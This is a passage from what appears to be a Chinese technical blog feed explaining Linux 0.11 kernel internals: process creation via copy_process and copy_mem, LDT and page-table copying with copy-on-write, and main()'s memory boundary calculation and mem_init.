里面保存的各种寄存器的信息，即<strong>上下文</strong>。</p><p>这里有两个寄存器的值的赋值有些特殊，就是 ss0 和 esp0，表示 0 特权级也就是内核态时的 ss:esp</p><p><code> p-&gt;tss.esp0 = PAGE_SIZE + (long) p</code> 指的是将内核态的栈顶指针 esp 指向新分配的这 1 页内存的顶端，之后的每个进程都会这样设置</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648951866867898/88bbee672c08a2ad73f38a684099f291e526acd3.png" alt="640 (1)"></p><p>总结一下 find_empty_process 和 copy_process 前半部分干了啥</p><p>调用了两个函数，首先会在 task 数组中找到空闲项，然后再在内存中找到空闲的一页内存，返回指针 p 并存入 task 数组的这个空闲项，再将进程 0 的结构都复制给新进程 p，再对 p 的值进行个性化修改。</p><p>接着往下看(后半部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_mem</span><span class="params">(<span class="keyword">int</span> nr,struct task_struct * p)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 局部描述符表 LDT 赋值</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> old_data_base,new_data_base,data_limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> old_code_base,new_code_base,code_limit;</span><br><span class="line">    code_limit = get_limit(<span class="number">0x0f</span>);</span><br><span class="line">    data_limit = get_limit(<span class="number">0x17</span>);</span><br><span class="line">    new_code_base = nr * <span class="number">0x4000000</span>;</span><br><span class="line">    new_data_base = nr * <span class="number">0x4000000</span>;</span><br><span class="line">    set_base(p-&gt;ldt[<span class="number">1</span>],new_code_base);</span><br><span class="line">    set_base(p-&gt;ldt[<span class="number">2</span>],new_data_base);</span><br><span class="line">    <span class="comment">// 拷贝页表</span></span><br><span class="line">    old_code_base = get_base(current-&gt;ldt[<span class="number">1</span>]);</span><br><span class="line">    old_data_base = get_base(current-&gt;ldt[<span class="number">2</span>]);</span><br><span class="line">    copy_page_tables(old_data_base,new_data_base,data_limit);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是<strong>新进程 LDT 表项的赋值，以及页表的拷贝</strong>。</p><h6 id="LDT-的赋值"><a href="#LDT-的赋值" class="headerlink" title="LDT 的赋值"></a>LDT 的赋值</h6><p>之前有说过，程序员给出的逻辑地址转换成物理地址要经过几个步骤：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649032750984256/607473eb2b9535abba2b66def59b1b8add5d4c2b.png" alt="640"></p><p>现在已经开启了分页，分页的具体转化如下(感觉图中应该是 13 M)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649033074101612/c64b56c662e33a389d175d046ac504d16f73d7b8.png" alt="640 (1)"></p><p>再将这个图简化和 GDT 表一起看</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649035058708990/2549d0ea2e98dea26801814b40e7ca4ab1347585.png" alt="640 (2)"></p><p>可以看到进程 0 的 LDT 的代码段和数据段，段基址都是 0 ，段限长时 640k 。而进程 1 ，也就是我们现在正在 fork 的进程，其代码段和数据段还没有设置。</p><p>所以第一步，局部描述符表 LDT 的赋值，就是给上图中两个未设置的代码段和数据段赋值。</p><p>其中的<strong>段限长</strong>，直接取自进程 0 设置好的，即 640 k。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code_limit = get_limit(<span class="number">0x0f</span>);</span><br><span class="line">data_limit = get_limit(<span class="number">0x17</span>);</span><br></pre></td></tr></table></figure><p>段基址，取决于当前是几号进程，也就是 nr 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_data_base = new_code_base = nr * <span class="number">0x4000000</span></span><br></pre></td></tr></table></figure><p>0x4000000 等于 64M，也就是说今后每个进程都会在线性地址空间中占用 64M 的空间，且相邻。</p><p>接着设置新进程局部描述符表中段描述符中的基地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_base(p-&gt;ldt[<span class="number">1</span>],new_code_base);</span><br><span class="line">set_base(p-&gt;ldt[<span class="number">2</span>],new_data_base);</span><br></pre></td></tr></table></figure><p>设置完成后的效果图</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649036338518275/ced162022a106cdc58008ffae57b5f4fc6a2a6fc.png" alt="640 (3)"></p><p>这即是段表的设置。</p><h6 id="页表的复制"><a href="#页表的复制" class="headerlink" title="页表的复制"></a>页表的复制</h6><p>刚刚讲完了段表的赋值，现在来讲讲页表的复制，也就是最后的 copy_page_tables 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_mem</span><span class="params">(<span class="keyword">int</span> nr,struct task_struct * p)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// old=0, new=64M, limit=640K</span></span><br><span class="line">    copy_page_tables(old_data_base,new_data_base,data_limit)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进程 0 有一个页目录表和四个页表，将线性地址空间的 0-16M 原封不动映射到了物理地址空间的 0-16M。新的进程，也需要一套映射关系的页表。来看看页表是怎么建立的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#mm&#x2F;memory.c</span><br><span class="line">&#x2F;*</span><br><span class="line"> *  Well, here is one of the most complicated functions in mm. It</span><br><span class="line"> * copies a range of linerar addresses by copying only the pages.</span><br><span class="line"> * Let&#39;s hope this is bug-free, &#39;cause this one I don&#39;t want to debug :-)</span><br><span class="line"> *&#x2F;</span><br><span class="line">int copy_page_tables(unsigned long from,unsigned long to,long size)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long * from_page_table;</span><br><span class="line">    unsigned long * to_page_table;</span><br><span class="line">    unsigned long this_page;</span><br><span class="line">    unsigned long * from_dir, * to_dir;</span><br><span class="line">    unsigned long nr;</span><br><span class="line"></span><br><span class="line">    from_dir &#x3D; (unsigned long *) ((from&gt;&gt;20) &amp; 0xffc);</span><br><span class="line">    to_dir &#x3D; (unsigned long *) ((to&gt;&gt;20) &amp; 0xffc);</span><br><span class="line">    size &#x3D; ((unsigned) (size+0x3fffff)) &gt;&gt; 22;</span><br><span class="line">    for( ; size--&gt;0 ; from_dir++,to_dir++) &#123;</span><br><span class="line">        if (!(1 &amp; *from_dir))</span><br><span class="line">            continue;</span><br><span class="line">        from_page_table &#x3D; (unsigned long *) (0xfffff000 &amp; *from_dir);</span><br><span class="line">        to_page_table &#x3D; (unsigned long *) get_free_page()</span><br><span class="line">        *to_dir &#x3D; ((unsigned long) to_page_table) | 7;</span><br><span class="line">        nr &#x3D; (from&#x3D;&#x3D;0)?0xA0:1024;</span><br><span class="line">        for ( ; nr-- &gt; 0 ; from_page_table++,to_page_table++) &#123;</span><br><span class="line">            this_page &#x3D; *from_page_table;</span><br><span class="line">            if (!(1 &amp; this_page))</span><br><span class="line">                continue;</span><br><span class="line">            this_page &amp;&#x3D; ~2;</span><br><span class="line">            *to_page_table &#x3D; this_page;</span><br><span class="line">            if (this_page &gt; LOW_MEM) &#123;</span><br><span class="line">                *from_page_table &#x3D; this_page;</span><br><span class="line">                this_page -&#x3D; LOW_MEM;</span><br><span class="line">                this_page &gt;&gt;&#x3D; 12;</span><br><span class="line">                mem_map[this_page]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    invalidate();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在进程 0 的线性地址空间是 0<del>64M，进程 1 的线性地址空间是 64M</del>128M。我们现在要<strong>造一个进程 1 的页表，使得进程 1 和进程 0 最终被映射到的物理空间都是 0 - 64M</strong>，这样进程 1 才能顺利运行起来。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1649058587201738/c0d13e59d768303b9a8fdb32c127f74460f1c367.png" alt="640"></p><p>总之，最终的效果就是：</p><p>假设现在正在运行进程 0，代码中给出一个虚拟地址 0x03，由于进程 0 的 LDT 中代码段基址是 0，所以线性地址也是 0x03，最终由进程 0 页表映射到物理地址 0x03 处。</p><p>假设现在正在运行进程 1，代码中给出一个虚拟地址 0x03，由于进程 1 的 LDT 中代码段基址是 64M，所以线性地址是 64M + 3，最终由进程 1 页表映射到物理地址也同样是 0x03 处。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1649058699631611/e3541df09abfdf203a6f3400505052850f133c00.png" alt="640 (1)"></p><p>即<strong>进程 0 和进程 1 目前共同映射物理内存的前 640K 的空间。</strong></p><p>如何将不同地址通过不同页表映射到相同物理地址空间？举个例子</p><p>刚刚的进程 0 的线性地址 0x03 用二进制表示是：</p><p>0000000000_0000000000_000000000011</p><p>刚刚的进程 1 的线性地址 64M + 0x03 用二进制表示是：</p><p>0000010000_0000000000_000000000011</p><p>根据分页机制的转化规则，<strong>前 10 位表示页目录项，中间 10 位表示页表项，后 12 位表页内偏移。</strong></p><p>进程 0 要找的是页目录项 0 中的第 0 号页表</p><p>进程 1 要找的是页目录项 16 中的第 0 号页表</p><p>那只要让这俩最终找到的两个页表里的数据一模一样即可。</p><p>由于代码非常绕，所以我们只要知道结果就行。</p><hr><p>这里做一个小补充，先放一张页表结构图</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1649059769511895/497437165bd4765e3191234a6abf74af7cac22a3.png" alt="640 (2)"></p><p>其中 RW 位表示读写状态，0 表示只读(或可执行)，1表示可读写(或可执行）。当然，在内核态也就是 0 特权级时，这个标志位是没用的。</p><p>然后我们看看下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_page_tables</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> from,<span class="keyword">unsigned</span> <span class="keyword">long</span> to,<span class="keyword">long</span> size)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span>( ; size--&gt;<span class="number">0</span> ; from_dir++,to_dir++) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">for</span> ( ; nr-- &gt; <span class="number">0</span> ; from_page_table++,to_page_table++) &#123;</span><br><span class="line">            ...</span><br><span class="line">            this_page &amp;= ~<span class="number">2</span>;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">if</span> (this_page &gt; LOW_MEM) &#123;</span><br><span class="line">                *from_page_table = this_page;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>~2 表示取反，2 用二进制表示是 10，取反就是 01，其目的是把 this_page 也就是当前的页表的 RW 位置零，也就是是<strong>把该页变成只读</strong>。</p><p>而 *from_page_table = this_page 表示<strong>又把源页表也变成只读</strong>。</p><p>也就是说，经过 fork 创建出的新进程，其页表项都是只读的，而且页表项的只读，导致源进程的页表项也是只读。</p><p>这个就是<strong>写时复制</strong>的基础，新老进程一开始共享同一个物理内存空间，如果只有读，那就相安无事，但如果任何一方有写操作，由于页面是只读的，将触发缺页中断，然后就会分配一块新的物理内存给产生写操作的那个进程，此时这一块内存就不再共享了。</p><hr><h6 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h6><p>总结一下 <strong>copy_process</strong> 函数做的三件事，把整个进程的数据结构个性化的从进程 0 复制给了进程 1。</p><ul><li> 复制了 task_struct ，并对一些值做了个性化修改。</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648950992137847/36d135e49cbd0845e5fc658b09355deb60dc3f61.png" alt="640"></p><ul><li>LDT 的复制和改造，使得进程 0 和进程 1 分别映射到了不同的线性地址空间。</li></ul><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1649036338518275/ced162022a106cdc58008ffae57b5f4fc6a2a6fc.png" alt="640 (3)"></p><ul><li><p>页表的复制，使得进程 0 和进程 1 又从不同的线性地址空间，被映射到了相同的物理地址空间。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1649058587201738/c0d13e59d768303b9a8fdb32c127f74460f1c367.png" alt="640"></p></li></ul><h2 id="死循环"><a href="#死循环" class="headerlink" title="死循环"></a>死循环</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有任何任务可以运行，操作系统会一直陷入这个死循环。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统之内核部分</title>
      <link href="/2022/03/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E6%A0%B8%E9%83%A8%E5%88%86/"/>
      <url>/2022/03/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%86%85%E6%A0%B8%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p> 之前所说的相当于是给访问内存的方式，做了个初步规划，包括去哪找代码、去哪找数据、去哪找栈，以及如何通过分段和分页机制将逻辑地址转换为最终的物理地址。</p><p>目前的内存分布图</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1647594025121391/e9a9bc8dbd50889b004df4c07e368e5a4a5d90e6.png" alt="640"></p><p>现在开始正式进入 main 函数分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ROOT_DEV = ORIG_ROOT_DEV;</span><br><span class="line">    drive_info = DRIVE_INFO;</span><br><span class="line">    memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);</span><br><span class="line">    memory_end &amp;= <span class="number">0xfffff000</span>;</span><br><span class="line">    <span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>) </span><br><span class="line">        buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    main_memory_start = buffer_memory_end;</span><br><span class="line"></span><br><span class="line">    mem_init(main_memory_start,memory_end);</span><br><span class="line">    trap_init();</span><br><span class="line">    blk_dev_init();</span><br><span class="line">    chr_dev_init();</span><br><span class="line">    tty_init();</span><br><span class="line">    time_init();</span><br><span class="line">    sched_init();</span><br><span class="line">    buffer_init(buffer_memory_end);</span><br><span class="line">    hd_init();</span><br><span class="line">    floppy_init();</span><br><span class="line"></span><br><span class="line">    sti();</span><br><span class="line">    move_to_user_mode();</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;;) pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参数取值与运算"><a href="#参数取值与运算" class="headerlink" title="参数取值与运算"></a>参数取值与运算</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ROOT_DEV = ORIG_ROOT_DEV;</span><br><span class="line">    drive_info = DRIVE_INFO;</span><br><span class="line">    memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);</span><br><span class="line">    memory_end &amp;= <span class="number">0xfffff000</span>;</span><br><span class="line">    <span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>) </span><br><span class="line">        buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">        buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">    main_memory_start = buffer_memory_end;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根设备 <code>ROOT_DEV</code>，各设备的参数信息 <code>drive_info</code>，以及计算得到的内存边界<code>main_memory_start</code>、<code>main_memory_end</code>、<code>buffer_memory_start</code>、<code>buffer_memory_end</code>。</p><p>具体说说内存边界的计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">memory_end = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>) + (EXT_MEM_K&lt;&lt;<span class="number">10</span>);</span><br><span class="line">memory_end &amp;= <span class="number">0xfffff000</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    memory_end = <span class="number">16</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">if</span> (memory_end &gt; <span class="number">12</span>*<span class="number">1024</span>*<span class="number">1024</span>) </span><br><span class="line">    buffer_memory_end = <span class="number">4</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (memory_end &gt; <span class="number">6</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    buffer_memory_end = <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    buffer_memory_end = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">main_memory_start = buffer_memory_end;</span><br></pre></td></tr></table></figure><p>整理一下可以发现，计算的就是三个变量：<code>main_memory_start</code>、<code>memory_end</code>、<code>buffer_memory_end</code>。又因为最后一行 <code>main_memory_start = buffer_memory_end</code>，所以最后其实只计算了两个变量<code>buffer_memory_end</code>、<code>memory_end</code>。</p><p>具体逻辑就是一堆以 memory_end 为标准的 if else 判断，也就是内存的最大值，通过<code>memory_end = (1&lt;&lt;20) + (EXT_MEM_K&lt;&lt;10)</code>可以看出，内存最大值等于 <code>1M + 扩展内存大小</code>。</p><p>所以这里说白了就是<strong>根据不同内存的大小，设置不同的边界值</strong>。</p><p>我们假设内存为 8 M 大小，，那么 memory_end 就是 8 * 1024 * 1024，buffer_memory_end =  main_memory_start = 2 * 1024 * 1024。用一张图表示就是：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1647601668029440/1d8daf264007aed295e7660dbfaa8f92f18bfee5.png" alt="640 (1)"></p><p>获得之前的设备参数信息的途径之前也说过，都是由 setup.s 这个汇编程序调用 BIOS 中断获取的各个设备的信息，并保存在以 0x90000 为首地址的内存处。</p><table><thead><tr><th>内存地址</th><th>长度(字节)</th><th>名称</th></tr></thead><tbody><tr><td>0x90000</td><td>2</td><td>光标位置</td></tr><tr><td>0x90002</td><td>2</td><td>扩展内存数</td></tr><tr><td>0x90004</td><td>2</td><td>显示页面</td></tr><tr><td>0x90006</td><td>1</td><td>显示模式</td></tr><tr><td>0x90007</td><td>1</td><td>字符列数</td></tr><tr><td>0x90008</td><td>2</td><td>未知</td></tr><tr><td>0x9000A</td><td>1</td><td>显示内存</td></tr><tr><td>0x9000B</td><td>1</td><td>显示状态</td></tr><tr><td>0x9000C</td><td>2</td><td>显卡特性参数</td></tr><tr><td>0x9000E</td><td>1</td><td>屏幕行数</td></tr><tr><td>0x9000F</td><td>1</td><td>屏幕列数</td></tr><tr><td>0x90080</td><td>16</td><td>硬盘1参数表</td></tr><tr><td>0x90090</td><td>16</td><td>硬盘2参数表</td></tr><tr><td>0x901FC</td><td>2</td><td>根设备号</td></tr></tbody></table><h2 id="初始化-init-操作"><a href="#初始化-init-操作" class="headerlink" title="初始化 init 操作"></a>初始化 init 操作</h2><p>上一节说白了就是<strong>给主内存、缓冲区、内核程序定义了三个边界</strong>。每个区具体怎么定义的还得看这一节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    mem_init(main_memory_start,memory_end);</span><br><span class="line">    trap_init();</span><br><span class="line">    blk_dev_init();</span><br><span class="line">    chr_dev_init();</span><br><span class="line">    tty_init();</span><br><span class="line">    time_init();</span><br><span class="line">    sched_init();</span><br><span class="line">    buffer_init(buffer_memory_end);</span><br><span class="line">    hd_init();</span><br><span class="line">    floppy_init();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包括<strong>内存初始化</strong> <strong>mem_init</strong>，<strong>中断初始化 trap_init</strong>、<strong>进程调度初始化 sched_init</strong> 等等。</p><h3 id="mem-init"><a href="#mem-init" class="headerlink" title="mem_init()"></a>mem_init()</h3><p>具体主内存区怎么管理和分配就要看 mem_init 里干了啥了。</p><p>管理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOW_MEM 0x100000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGING_MEMORY (15*1024*1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGING_PAGES (PAGING_MEMORY&gt;&gt;12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_NR(addr) (((addr)-LOW_MEM)&gt;&gt;12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USED 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> HIGH_MEMORY = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> mem_map[PAGING_PAGES] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// start_mem = 2 * 1024 * 1024</span></span><br><span class="line"><span class="comment">// end_mem = 8 * 1024 * 1024</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start_mem, <span class="keyword">long</span> end_mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    HIGH_MEMORY = end_mem;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;PAGING_PAGES ; i++)</span><br><span class="line">        mem_map[i] = USED;</span><br><span class="line">    i = MAP_NR(start_mem);</span><br><span class="line">    end_mem -= start_mem;</span><br><span class="line">    end_mem &gt;&gt;= <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">while</span> (end_mem--&gt;<span class="number">0</span>)</span><br><span class="line">        mem_map[i++]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给 mem_map 的各个位置赋值，USED 是100，表示被占用 100 次，赋值为 0 表示未被占用；说白了就是<strong>准备了一个表，记录内存中哪些被占用了哪些没被占用</strong>。这就是所谓的管理。</p><p>那么问题来了，数组能表示的范围有多大？初始化时那些地方时占用的，哪些地方又是未占用的？</p><p>用一张图就可以解释，我们假设内存总共只有 8M。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1647998568100717/6f87e9989e63b9e4439b63967df034230bf26555.png" alt="640"></p><p>可以看出，初始化完成后，其实就是 mem_map 这个数组每个元素都代表一个 4k 内存是否空闲(准确来说是使用次数)。</p><p>4k 内存叫做 1页 内存，将内存分成一页一页(4k)的单位去管理，也就是<strong>分页管理</strong>。</p><p>1M 以下的内存是没有被管理的，因为这里是内核代码所在的地方，没有权限管理。</p><p>1M ~ 2M 是<strong>缓冲区</strong>，2M 是缓冲区的末端，不是主内存区域，所以被标记为 USED 